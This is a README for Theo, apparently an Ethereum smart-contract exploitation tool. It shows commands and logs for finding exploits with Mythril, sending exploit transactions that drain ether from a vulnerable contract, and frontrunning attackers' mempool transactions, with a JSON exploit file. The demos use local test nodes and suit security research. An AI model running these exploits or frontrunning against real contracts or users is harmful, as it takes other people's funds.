# Theo

![License](https://img.shields.io/github/license/cleanunicorn/theo.svg)
[![CircleCI](https://circleci.com/gh/cleanunicorn/theo/tree/master.svg?style=shield)](https://circleci.com/gh/cleanunicorn/theo)
[![Codacy Badge](https://api.codacy.com/project/badge/Grade/71da66211eff42f298062a883b7fa5e9)](https://www.codacy.com/app/lucadanielcostin/theo)
[![PyPI](https://img.shields.io/pypi/v/theo.svg)](https://pypi.org/project/theo/)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/ambv/black)

Theo aims to be an exploitation framework and a blockchain recon and interaction tool.

Features:

- Automatic smart contract scanning which generates a list of possible exploits.
- Sending transactions to exploit a smart contract.
- Transaction pool monitor.
- Web3 console
- Frontrunning and backrunning transactions.
- Waiting for a list of transactions and sending out others.
- Estimating gas for transactions means only successful transactions are sent.
- Disabling gas estimation will send transactions with a fixed gas quantity.

<!--![Theo](./static/theo-profile.png)-->

He knows [Karl](https://github.com/cleanunicorn/karl) from work.

Theo's purpose is to fight script kiddies that try to be leet hackers. He can listen to them trying to exploit his honeypots and make them lose their funds, for his own gain.

> "You didn't bring me along for my charming personality."

## Install

Theo is available as a PyPI package:

```console
$ pip install theo
$ theo --help
usage: theo [-h] [--rpc-http RPC_HTTP] [--rpc-ws RPC_WS] [--rpc-ipc RPC_IPC]
            [--account-pk ACCOUNT_PK] [--contract ADDRESS]
            [--skip-mythril SKIP_MYTHRIL] [--load-file LOAD_FILE] [--version]

Monitor contracts for balance changes or tx pool.

optional arguments:
  -h, --help            show this help message and exit
  --rpc-http RPC_HTTP   Connect to this HTTP RPC (default:
                        http://127.0.0.1:8545)
  --account-pk ACCOUNT_PK
                        The account's private key (default: None)
  --contract ADDRESS    Contract to monitor (default: None)
  --skip-mythril SKIP_MYTHRIL
                        Don't try to find exploits with Mythril (default:
                        False)
  --load-file LOAD_FILE
                        Load exploit from file (default: )
  --version             show program's version number and exit

RPC connections:
  --rpc-ws RPC_WS       Connect to this WebSockets RPC (default: None)
  --rpc-ipc RPC_IPC     Connect to this IPC RPC (default: None)
```

Install from sources

```console
$ git clone https://github.com/cleanunicorn/theo
$ cd theo
$ virtualenv ./venv
$ . ./venv/bin/activate
$ pip install -r requirements.txt
$ pip install -e .
$ theo --help
```

Requirements: 

- Python 3.5 or higher.
- An Ethereum node with RPC available. [Ganache](https://github.com/trufflesuite/ganache-cli) works really well for testing or for validating exploits.

## Demos

### Find exploit and execute it

Scan a smart contract, find exploits, exploit it:

- Start Ganache as our local Ethereum node
- Deploy the vulnerable contract (happens in a different window)
- Scan for exploits
- Run exploit

[![asciicast](https://asciinema.org/a/CgTH8tIAoGsgEYsd7XN65tJSp.svg)](https://asciinema.org/a/CgTH8tIAoGsgEYsd7XN65tJSp?speed=2)

### Frontrun victim

Setup a honeypot, deploy honeypot, wait for attacker, frontrun:

- Start geth as our local Ethereum node
- Start mining
- Deploy the honeypot
- Start Theo and scan the mem pool for transactions
- Frontrun the attacker and steal his ether

[![asciicast](https://asciinema.org/a/n2HnSJvgopf8AKCoSfEJVgvxU.svg)](https://asciinema.org/a/n2HnSJvgopf8AKCoSfEJVgvxU?speed=2)

## Usage

### Help screen

It's a good idea to check the help screen first.

```console
$ theo --help
usage: theo [-h] [--rpc-http RPC_HTTP] [--rpc-ws RPC_WS] [--rpc-ipc RPC_IPC]
            [--account-pk ACCOUNT_PK] [--contract ADDRESS] [--skip-mythril]
            [--load-file LOAD_FILE] [--version]

Monitor contracts for balance changes or tx pool.

optional arguments:
  -h, --help            show this help message and exit
  --rpc-http RPC_HTTP   Connect to this HTTP RPC (default:
                        http://127.0.0.1:8545)
  --account-pk ACCOUNT_PK
                        The account's private key (default: None)
  --contract ADDRESS    Contract to interact with (default: None)
  --skip-mythril        Skip scanning the contract with Mythril (default:
                        False)
  --load-file LOAD_FILE
                        Load exploit from file (default: )
  --version             show program's version number and exit

RPC connections:
  --rpc-ws RPC_WS       Connect to this WebSockets RPC (default: None)
  --rpc-ipc RPC_IPC     Connect to this IPC RPC (default: None)
```

### Symbolic execution

A list of exploits is automatically identified using [mythril](https://github.com/ConsenSys/mythril).

Start a session by running:

```console
$ theo --contract=<scanned contract> --account-pk=<your private key>
Scanning for exploits in contract: 0xa586074fa4fe3e546a132a16238abe37951d41fe
Connecting to HTTP: http://127.0.0.1:8545.
Found exploits(s):
 [Exploit: (txs=[Transaction {Data: 0xcf7a8965, Value: 1000000000000000000}])]

A few objects are available in the console:
- `exploits` is an array of loaded exploits found by Mythril or read from a file
- `w3` an initialized instance of web3py for the provided HTTP RPC endpoint

Check the readme for more info:
https://github.com/cleanunicorn/theo

>>> 
```

It will analyze the contract and will find a list of available exploits.

You can see the available exploits found. In this case one exploit was found. Each exploit is an [Exploit](https://github.com/cleanunicorn/theo/blob/master/theo/exploit/exploit.py) object.

```console
>>> exploits[0]
Exploit: (txs=[Transaction: {'input': '0xcf7a8965', 'value': '0xde0b6b3a7640000'}])
```

### Running exploits

The exploit steps can be run by calling `.execute()` on the exploit object. The transactions will be signed and sent to the node you're connected to.

```console
>>> exploits[0].execute()
2019-07-22 11:26:12,196 - Sending tx: {'to': '0xA586074FA4Fe3E546A132a16238abe37951D41fE', 'gasPrice': 1, 'gas': 30521, 'value': 1000000000000000000, 'data': '0xcf7a8965', 'nonce': 47} 
2019-07-22 11:26:12,200 - Waiting for 0x41b489c78f654cab0b0451fc573010ddb20ee6437cdbf5098b6b03ee1936c33c to be mined... 
2019-07-22 11:26:16,337 - Mined 
2019-07-22 11:26:16,341 - Initial balance:      1155999450759997797167 (1156.00 ether) 
2019-07-22 11:26:16,342 - Final balance:        1156999450759997768901 (1157.00 ether) 
```

### Frontrunning

You can start the frontrunning monitor to listen for other hackers trying to exploit the honeypot.

Use `.frontrun()` to start listening for the exploit and when found, send a transaction with a higher gas price.

```console
>>> exploits[0].frontrun()
2019-07-22 11:22:26,285 - Scanning the mem pool for transactions... 
2019-07-22 11:22:45,369 - Found tx: 0xf6041abe6e547cea93e80a451fdf53e6bdae67820244246fde44098f91ce1c20 
2019-07-22 11:22:45,375 - Sending tx: {'to': '0xA586074FA4Fe3E546A132a16238abe37951D41fE', 'gasPrice': '0x2', 'data': '0xcf7a8965', 'gas': 30522, 'value': 1000000000000000000, 'nonce': 45} 
2019-07-22 11:22:45,380 - Waiting for 0xa73316daf806e7eef83d09e467c32ce5faa239c6eda3a270a8ce7a7aae48fb7e to be mined... 
2019-07-22 11:22:56,852 - Mined 
```

> "Oh, my God! The quarterback is toast!"

This works very well for some specially crafted [contracts](./contracts/) or some other vulnerable contracts, as long as you make sure frontrunning is in your favor.

### Load transactions from file

Instead of identifying the exploits with mythril, you can specify the list of exploits yourself.

Create a file that looks like this [exploits.json](./test/input-tx.json):

```json
[
    [
        {
            "name": "claimOwnership()",
            "input": "0x4e71e0c8",
            "value": "0xde0b6b3a7640000"
        },
        {
            "name": "retrieve()",
            "input": "0x2e64cec1",
            "value": "0x0"
        }
    ],
    [
        {
            "name": "claimOwnership()",
            "input": "0x4e71e0c8",
            "value": "0xde0b6b3a7640000"
        }
    ]
]
```

This one defines 2 exploits, the first one has 2 transactions and the second one only has 1 transaction. 

You can load it with: 

```console
$ theo --load-file=./exploits.json
```

# Troubleshooting

## openssl/aes.h: No such file or directory

If you get this error, you need the libssl source libraries:

```
    scrypt-1.2.1/libcperciva/crypto/crypto_aes.c:6:10: fatal error: openssl/aes.h: No such file or directory
     #include <openssl/aes.h>
              ^~~~~~~~~~~~~~~
    compilation terminated.
    error: command 'x86_64-linux-gnu-gcc' failed with exit status 1
    
    ----------------------------------------
Command "/usr/bin/python3 -u -c "import setuptools, tokenize;__file__='/tmp/pip-build-5rl4ep94/scrypt/setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.read().replace('\r\n', '\n');f.close();exec(compile(code, __file__, 'exec'))" install --record /tmp/pip-mnbzx9qe-record/install-record.txt --single-version-externally-managed --compile" failed with error code 1 in /tmp/pip-build-5rl4ep94/scrypt/
```

On Ubuntu you can install them with:
```console
$ sudo apt install libssl-dev
```
